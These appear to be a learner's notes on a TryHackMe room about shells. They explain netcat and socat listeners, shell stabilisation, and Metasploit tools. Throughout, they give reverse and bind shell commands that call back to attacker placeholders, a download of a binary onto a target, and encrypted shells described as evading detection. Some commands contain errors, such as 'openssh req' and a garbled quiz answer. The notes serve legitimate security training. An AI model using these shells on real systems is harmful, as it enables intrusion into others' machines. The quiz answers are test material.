# THM Room: What the Shell? #

## What is a shell? ##

* In the simplest possible term; a shell is what we use to interact with a Command Line Environment or (CLI).
* we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).
* There are a variety of tools that we will be using to receive reverse shells and to send bind shells.

## Tools ##

1. Netcat
1. Socat
1. Metasploit Framework
1. Msfvenom

### 1. Netcat ###

* Netcat is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved by techniques that we will be covering in an upcoming task.

```ZSH
# To start a listener
nc -lvnp <port-number>

# To connect to a 'Target' system
nc <target-ip> <chosen-port>
```

> It's often a good idea to use a well-known port number (80, 443 or 53 being good choices) as this is more likely to get past outbound firewall rules on the target.

#### Netcat shell stabilization ####

* Netcat shells are not very stable by default. Pressing `Ctrl + C` kills the whole thing.
* They are non interactive and often have strange formatting issues.
* Fortunately there are many ways to stabilize a shell, and we will discuss three techniques here;

##### Techniques #####

1. Python
2. rlwrap
3. Socat

> Python

1. The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell; note that some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and Ctrl + C will still kill the shell.
2. Step two is: `export TERM=xterm` -- this will give us access to term commands such as clear.
3. Finally (and most importantly) we will background the shell using `Ctrl + Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab auto completes, the arrow keys, and Ctrl + C to kill processes). It then foregrounds the shell, thus completing the process. 

* The full technique can be seen here:

> rlwrap

1. rlwrap is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell; however, some manual stabilization must still be utilised if you want to be able to use `Ctrl + C` inside the shell. rlwrap is not installed by default on Kali, so first install it with `sudo apt install rlwrap`.

To use rlwrap, we invoke a slightly different listener:

```ZSH
rlwrap nc -lvnp <port>
```

2. Prepending our netcat listener with "rlwrap" gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique: background the shell with `Ctrl + Z`, then use `stty raw -echo; fg` to stabilise and re-enter the shell. 

> Socat

1. The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. Bear in mind that this technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell. To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing your socat binary `sudo python3 -m http.server 80`, then, on the target machine, using the netcat shell to download the file. On Linux this would be accomplished with curl or wget `wget <LOCAL-IP>/socat -O /tmp/socat`.

For the sake of completeness: in a Windows CLI environment the same can be done with Powershell, using either Invoke-WebRequest or a webrequest system class, depending on the version of Powershell installed `Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`. We will cover the syntax for sending and receiving shells with Socat in the upcoming tasks. 

### 2. Socat ###

* Socat is like netcat on steroids. It can do all of the same things, and many more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat; however, there are two big catches:

1. The syntax is more difficult
2. Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

* There are work arounds to both of these problems, which we will cover later on.
* Both Socat and Netcat have .exe versions for use on Windows.

> More

* Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. In the interests of this room, this will essentially be a listening port and the keyboard, however, it could also be a listening port and a file, or indeed, two listening ports. All socat does is provide a link between two points -- much like the portal gun from the Portal games!

> Reverse Shells

* As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat:

```ZSH
socat TCP-L:<port> -
```

* As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to nc -lvnp <port>.
* On Windows we would use this command to connect back:

```ZSH
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
```

* The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
* This is the equivalent command for a Linux Target:

```ZSH
socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"
```

> Bind Shells

* On a Linux target we would use the following command:

```ZSH
socat TCP-L:<PORT> EXEC:"bash -li"
```

* On a Windows target we would use this command for our listener:

```ZSH
socat TCP-L:<PORT> EXEC:powershell.exe,pipes
```

* We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.
* Regardless of the target, we use this command on our attacking machine to connect to the waiting listener.

```ZSH
socat TCP:<TARGET-IP>:<TARGET-PORT> -
```

> Setting a Linux tty reverse shell

* Now let's take a look at one of the more powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. As mentioned earlier, socat is an incredibly versatile tool; however, the following technique is perhaps one of its most useful applications. Here is the new listener syntax:

```ZSH
socat TCP-L:<port> FILE:`tty`,raw,echo=0
```

* Let's break this command down into its two parts. As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the `Ctrl + Z`, `stty raw -echo; fg` trick with a netcat shell -- with the added bonus of being immediately stable and hooking into a full tty.
* The first listener can be connected to with any payload; however, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a [precompiled socat binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat?raw=true), which can then be executed as normal.

The special command is as follows:

```ZSH
socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

* The first part is easy -- we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with  EXEC:"bash -li". We're also passing the arguments: pty, stderr, sigint, setsid and sane:
* pty, allocates a pseudoterminal on the target -- part of the stabilisation process
* stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
* sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
* setsid, creates the process in a new session
* sane, stabilises the terminal, attempting to "normalise" it.

 let's see it in action.

As normal, on the left we have a listener running on our local attacking machine, on the right we have a simulation of a compromised target, running with a non-interactive shell. Using the non-interactive netcat shell, we execute the special socat command, and receive a fully interactive bash shell on the socat listener to the left:
![socat in action](https://i.imgur.com/etAuYzz.png)

* Note that the socat shell is fully interactive, allowing us to use interactive commands such as SSH. This can then be further improved by setting the stty values as seen in the previous task, which will let us use text editors such as Vim or Nano.
* If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.

#### Socat Encrypted Shells ####

* One the main benefits of socat is that it is capable of creating encrypted shells which can't be spied on unless you have a decryption key, and are often able to bypass IDS systems.
* When working with encrypted shells, we would use `OPENSSL` instead of `TCP`.
* First we are gonna need to generate a certificate in order to use encrypted shells.

This is how to do it on our attacker machine;

```ZSH
openssh req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
```

This command creates a 2048 bit RSA key with machine cert file, self signed and valid for use for one year.

* When you run this command it will ask you to fill out a form which you can leave blank. 

When you need to merge the two created files into a single `.pem` file.

```ZSH
cat shell.key shell.crt > shell.pem
```

* Now when we set our reverse shell we use;

```ZSH
socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -
```

* This sets up an OPENSSL listener using our generated certificate. verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

To connect back, we would use:

```ZH
socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
```

The same technique would apply for a bind shell:

Target:

```ZSH
socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes
```

Attacker:

```ZSH
socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
```

* Again, note that even for a Windows target, the certificate must be used with the listener, so copying the PEM file across for a bind shell is required.

The following image shows an OPENSSL Reverse shell from a Linux target. As usual, the target is on the right, and the attacker is on the left:

### THM-Questions ###

1. What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"

* Answer: `socat openssl-listen:53,cert=encrypt.pem,file:`tty`:verify,raw,echo=0`

2. If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

* Answer: `socat openssl:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`

### 3. Metasploit ###

* The `auxiliary/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells. Due to being part of the Metasploit framework, `multi/handler` provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a meterpreter shell, and is the easiest way to handle staged payloads -- both of which we will look at in task 9.

### 4. Msfvenom ###

* Like multi/handler, `msfvenom` is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly. Whilst msfvenom can generate payloads other than reverse and bind shells, these are what we will be focusing on in this room. Msfvenom is an incredibly powerful tool, so we will go into its application in much more detail in a dedicated task.

> With any of the above techniques, 

* It's useful to be able to change your terminal tty size. This is something that your terminal will do automatically when using a regular shell; however, it must be done manually in a reverse or bind shell if you want to use something like a text editor which overwrites everything on the screen.
* First, open another terminal and run stty -a. This will give you a large stream of output. Note down the values for "rows" and columns:
* Next, in your reverse/bind shell, type in:

```ZSH
stty rows <number>

and

stty cols <number>
```

* Filling in the numbers you got from running the command in your own terminal.
* This will change the registered width and height of the terminal, thus allowing programs such as text editors which rely on such information being accurate to correctly open.
